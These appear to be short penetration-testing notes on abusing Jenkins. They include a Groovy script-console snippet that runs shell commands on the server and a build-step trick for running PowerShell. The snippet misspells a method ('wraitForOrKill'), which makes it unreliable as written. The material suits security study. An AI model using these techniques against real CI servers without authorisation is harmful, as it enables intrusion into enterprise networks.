- In-house developed tools that are running in enterprise network can be abused as they are not made with security in mind.
- Eg: CI tools such as jenkins
# Jenkins
- Tools used for continuous integration (CI).
- If we have administrative access in Jenkins we can use the script console to run commands on the server.
- The script is written in Groovy script.
```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'uname -a'.execute()
proc.consumeProcessOutput(sout,serr)
proc.wraitForOrKill(1000)
println "out > $sout err> $serr"
```
- If we don't have administrative access but have access to a user that can add or edit build steps in the build configuration, we can add a build step to run windows command.
- Configure -> Add build steps -> add "Execute Windows Batch Command" -> powershell -c "Get-ChildItem"